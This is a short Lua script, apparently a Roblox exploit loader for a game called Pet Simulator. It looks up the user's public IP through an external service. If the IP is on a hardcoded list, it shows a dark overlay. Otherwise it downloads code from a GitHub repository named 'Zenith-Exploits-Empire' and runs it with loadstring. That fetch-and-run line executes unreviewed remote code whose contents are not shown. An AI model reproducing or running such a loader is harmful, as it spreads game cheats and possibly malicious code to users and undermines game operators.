-- Generated for admin
-- Blocked IPs (will blur screen)
local blocked_ips = {"1.2.3.4", "5.6.7.8"}
local HttpService = game:GetService("HttpService")
local ip = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json")).ip
for _, b in ipairs(blocked_ips) do
  if ip == b then
    local gui = Instance.new("ScreenGui", game.CoreGui)
    local blur = Instance.new("Frame", gui)
    blur.Size = UDim2.new(1, 0, 1, 0)
    blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blur.BackgroundTransparency = 0.5
    return
  end
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%209"))()